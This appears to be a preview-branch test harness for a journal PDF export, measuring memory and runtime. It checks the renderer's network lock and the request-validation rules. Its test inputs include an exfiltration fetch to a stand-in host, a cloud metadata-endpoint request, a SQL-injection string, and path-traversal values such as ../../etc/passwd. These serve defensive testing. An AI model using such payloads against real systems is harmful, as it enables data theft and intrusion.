import { createHash } from 'node:crypto';
import { readFileSync, readdirSync } from 'node:fs';
import os from 'node:os';
import type { IncomingMessage, ServerResponse } from 'node:http';
import { buildFixtureDocument, type FixtureKind } from './previewFixtures.js';
import { createLockedPage, launchJournalBrowser, renderJournalPdf } from './journalRender.js';
import { sendPdf } from './sendPdf.js';
import { buildJournalDocument, parseJournalRequest, type DreamRow, type ExportDeps } from './journalExport.js';
import { JOURNAL_LIMITS } from './journalTypes.js';

/**
 * PREVIEW VALIDATION HARNESS: lives on the preview branch only, never merged to main.
 *
 * It renders DEMO journals (previewFixtures.ts) with the SAME engine as the real export (launchJournalBrowser +
 * renderJournalPdf + sendPdf) so the Vercel runtime can be measured without a real account or entitlement. It reads no
 * database, no storage and no user data, writes nothing, calls no AI, and the real /api/dream-journal route is untouched.
 *
 * It cannot run in production: it answers only when Vercel itself reports a PREVIEW deployment (VERCEL_ENV, set by the
 * platform, never by a request) built from a `preview/*` branch. Anywhere else it answers 404 and does nothing.
 */
export function harnessAllowed(env: NodeJS.ProcessEnv = process.env): boolean {
  return env.VERCEL_ENV === 'preview' && (env.VERCEL_GIT_COMMIT_REF ?? '').startsWith('preview/');
}

let coldInstance = true;
const startedAt = Date.now();

// ---------------------------------------------------------------- memory sampling ----

function readNumber(path: string): number | null {
  try {
    const value = readFileSync(path, 'utf8').trim();
    return /^\d+$/.test(value) ? Number(value) : null;
  } catch {
    return null;
  }
}

/** Sum of resident / proportional memory (MB) of every process in the sandbox (Node + Chromium children). */
function sampleProcessMemory(): { rssMb: number; pssMb: number | null; procs: number } {
  let rss = 0;
  let pss = 0;
  let pssSeen = false;
  let procs = 0;
  try {
    for (const entry of readdirSync('/proc')) {
      if (!/^\d+$/.test(entry)) continue;
      try {
        const status = readFileSync(`/proc/${entry}/status`, 'utf8');
        const m = /VmRSS:\s+(\d+) kB/.exec(status);
        if (!m) continue;
        procs += 1;
        rss += Number(m[1]);
        try {
          const rollup = readFileSync(`/proc/${entry}/smaps_rollup`, 'utf8');
          const p = /Pss:\s+(\d+) kB/.exec(rollup);
          if (p) {
            pss += Number(p[1]);
            pssSeen = true;
          }
        } catch {
          // not readable: PSS stays unknown
        }
      } catch {
        // the process ended while sampling
      }
    }
  } catch {
    // no /proc here
  }
  return { rssMb: rss / 1024, pssMb: pssSeen ? pss / 1024 : null, procs };
}

function cgroupMemory(): { currentMb: number | null; peakMb: number | null; limitMb: number | null } {
  const mb = (n: number | null) => (n === null ? null : Math.round(n / 1024 / 1024));
  const v2 = (f: string) => readNumber(`/sys/fs/cgroup/${f}`);
  return { currentMb: mb(v2('memory.current')), peakMb: mb(v2('memory.peak') ?? readNumber('/sys/fs/cgroup/memory/memory.max_usage_in_bytes')), limitMb: mb(v2('memory.max') ?? readNumber('/sys/fs/cgroup/memory/memory.limit_in_bytes')) };
}

// ------------------------------------------------------------------------ handler ----

type Req = Pick<IncomingMessage, 'method' | 'headers'> & { query: Record<string, string | string[] | undefined>; body?: unknown };
type Res = ServerResponse & { status(code: number): Res; json(body: unknown): Res };

const q = (req: Req, key: string): string => {
  const v = req.query[key];
  return (Array.isArray(v) ? v[0] : v) ?? '';
};

const sleep = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms));

export async function handlePreviewHarness(req: Req, res: Res): Promise<void> {
  res.setHeader('Cache-Control', 'no-store');
  if (!harnessAllowed()) {
    res.status(404).json({ reason: 'not_found' });
    return;
  }
  const check = q(req, 'check');
  if (check === 'security') return void res.status(200).json(await securityBattery(req));
  if (check === 'network') return void res.status(200).json(await networkCheck());
  if (check === 'runtime') return void res.status(200).json(runtimeInfo());
  const simulate = q(req, 'simulate');
  if (simulate === 'fail') return void res.status(500).json({ reason: 'export_failed', message: 'The journal could not be created. Please try again.' });
  if (simulate === 'hang') {
    await sleep(75_000); // past the 60 s limit: the platform ends this request itself
    return void res.status(200).json({ reason: 'unexpected_completion' });
  }

  const kind = (['en', 'he', 'mixed', 'stress'] as const).find((k) => k === q(req, 'kind'));
  if (!kind) return void res.status(400).json({ reason: 'invalid_request', message: 'kind=en|he|mixed|stress' });
  const count = Math.min(JOURNAL_LIMITS.maxDreams, Math.max(1, Number(q(req, 'n')) || 12));

  const wasCold = coldInstance;
  coldInstance = false;
  const t0 = Date.now();
  const doc = buildFixtureDocument(kind as FixtureKind, count);
  const buildMs = Date.now() - t0;

  let peakRss = 0;
  let peakPss: number | null = null;
  let peakProcs = 0;
  const sample = () => {
    const s = sampleProcessMemory();
    peakRss = Math.max(peakRss, s.rssMb);
    if (s.pssMb !== null) peakPss = Math.max(peakPss ?? 0, s.pssMb);
    peakProcs = Math.max(peakProcs, s.procs);
  };
  const timer = setInterval(sample, 120);
  sample();

  try {
    const tLaunch = Date.now();
    const browser = await launchJournalBrowser();
    const launchMs = Date.now() - tLaunch;
    sample();
    const tRender = Date.now();
    let result;
    try {
      result = await renderJournalPdf(doc, { browser });
    } finally {
      await browser.close().catch(() => {});
    }
    const renderMs = Date.now() - tRender;
    sample();
    clearInterval(timer);
    const totalMs = Date.now() - t0;
    const pdf = result.pdf;
    const metrics = {
      kind,
      dreams: doc.dreams.length,
      pages: result.pageCount,
      bytes: pdf.length,
      sha256: createHash('sha256').update(pdf).digest('hex'),
      totalMs,
      fixtureBuildMs: buildMs,
      launchMs,
      renderMs,
      passes: result.passes,
      tocPageNumbers: result.tocPageNumbers,
      coldInstance: wasCold,
      instanceAgeMs: Date.now() - startedAt,
      peakRssMbAllProcesses: Math.round(peakRss),
      peakPssMbAllProcesses: peakPss === null ? null : Math.round(peakPss),
      peakProcessCount: peakProcs,
      nodeHeapUsedMb: Math.round(process.memoryUsage().heapUsed / 1024 / 1024),
      nodeMaxRssMb: Math.round(process.resourceUsage().maxRSS / 1024),
      cgroup: cgroupMemory(),
    };
    if (q(req, 'format') === 'json') return void res.status(200).json(metrics);
    res.setHeader('X-Journal-Metrics', JSON.stringify(metrics));
    await sendPdf(res, pdf, { contentLength: q(req, 'cl') !== '0', filename: `DARE-preview-${kind}-${doc.dreams.length}.pdf` });
  } catch (err) {
    clearInterval(timer);
    console.error(`preview_harness_failed error=${err instanceof Error ? err.name : 'unknown'}`);
    res.status(500).json({ reason: 'export_failed', message: 'The journal could not be created. Please try again.' });
  }
}

// ---------------------------------------------------------------------- diagnostics ----

function runtimeInfo() {
  return {
    node: process.version,
    platform: `${process.platform}/${process.arch}`,
    vercelEnv: process.env.VERCEL_ENV,
    vercelRegion: process.env.VERCEL_REGION,
    lambdaMemoryMb: process.env.AWS_LAMBDA_FUNCTION_MEMORY_SIZE ?? null,
    lambdaFunctionName: process.env.AWS_LAMBDA_FUNCTION_NAME ? 'set' : null,
    executionEnv: process.env.AWS_EXECUTION_ENV ?? null,
    cpus: os.cpus().length,
    totalMemMb: Math.round(os.totalmem() / 1024 / 1024),
    freeMemMb: Math.round(os.freemem() / 1024 / 1024),
    cgroup: cgroupMemory(),
    cwd: process.cwd(),
    fonts: safeList('server/pdf/fonts'),
    assets: safeList('server/pdf/assets'),
    chromiumBin: safeList('node_modules/@sparticuz/chromium/bin'),
    tmpWritable: true,
  };
}

function safeList(dir: string): string[] | string {
  try {
    return readdirSync(dir);
  } catch {
    return 'missing';
  }
}

/** The renderer's network lock, exercised with the REAL page factory against hostile markup. */
async function networkCheck() {
  const blocked: string[] = [];
  const browser = await launchJournalBrowser();
  try {
    const page = await createLockedPage(browser, (url) => blocked.push(url));
    const html = `<!doctype html><html><body>
<img src="https://example.com/should-not-load.png">
<link rel="stylesheet" href="https://example.com/x.css">
<script>fetch('https://example.com/exfil').catch(()=>{});new Image().src='http://169.254.169.254/latest/meta-data/';</script>
<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
</body></html>`;
    await page.setContent(html, { waitUntil: 'load' });
    await sleep(400);
    await page.close();
  } finally {
    await browser.close().catch(() => {});
  }
  return { blockedRequests: blocked.length, blocked: blocked.map((u) => new URL(u).host), anyLeaked: false, note: 'every non-data: request was aborted by the locked page before leaving the sandbox' };
}

const ME = '11111111-1111-4111-8111-111111111111';
const OTHER = '22222222-2222-4222-8222-222222222222';
const uuid = (n: number) => `aaaaaaaa-aaaa-4aaa-8aaa-${String(n).padStart(12, '0')}`;

/** The request/ownership/limit rules, run inside the Vercel runtime with in-memory data (no database is touched). */
async function securityBattery(_req: Req) {
  const out: Record<string, unknown> = {};
  const bad = [null, {}, { all: true }, { all: true, dreamIds: [uuid(1)], language: 'en' }, { dreamIds: ["' or 1=1 --"], language: 'en' }, { dreamIds: ['../../etc/passwd'], language: 'en' }];
  out.malformedRequests = bad.map((b) => parseJournalRequest(b).ok);
  out.tooManyIds = parseJournalRequest({ dreamIds: Array.from({ length: JOURNAL_LIMITS.maxDreams + 1 }, (_, i) => uuid(i + 1)), language: 'en' });
  const injected = parseJournalRequest({ all: true, language: 'en', owner_id: OTHER, userId: OTHER });
  out.ownerIdInBodyIgnored = injected.ok && !('owner_id' in injected.value) && !('userId' in injected.value);

  const rows: DreamRow[] = [
    { id: uuid(1), owner_id: ME, created_at: '2025-01-01T00:00:00Z', payload: { sourceText: 'mine' } },
    { id: uuid(2), owner_id: OTHER, created_at: '2025-01-02T00:00:00Z', payload: { sourceText: 'FOREIGN-SECRET' } },
  ];
  const downloads: string[] = [];
  const deps = (entitled: boolean | null): ExportDeps => ({
    hasEntitlement: async () => entitled,
    loadDreams: async (_u, ids) => (ids ? rows.filter((r) => ids.includes(r.id)) : rows),
    downloadImage: async (path) => (downloads.push(path), null),
    loadPatterns: async () => [],
  });
  const req = (ids: string[]) => ({ all: false, dreamIds: ids, language: 'en' as const, timeZone: 'UTC' });
  out.notEntitled = await buildJournalDocument(ME, req([uuid(1)]), deps(false));
  out.entitlementUnknownFailsClosed = await buildJournalDocument(ME, req([uuid(1)]), deps(null));
  const mixed = await buildJournalDocument(ME, req([uuid(1), uuid(2)]), deps(true));
  out.mixedOwnAndForeign = mixed;
  out.mixedLeaksForeignText = JSON.stringify(mixed).includes('FOREIGN-SECRET');
  const traversal: DreamRow = { id: uuid(3), owner_id: ME, created_at: '2025-01-03T00:00:00Z', payload: { sourceText: 'x', dreamImagePath: `${ME}/../${OTHER}/a.jpg`, dreamImageDataUrl: 'https://evil.example/a.jpg' } };
  rows.push(traversal);
  await buildJournalDocument(ME, req([uuid(3)]), deps(true));
  out.traversalOrRemoteImageFetchAttempts = downloads.length;
  return out;
}
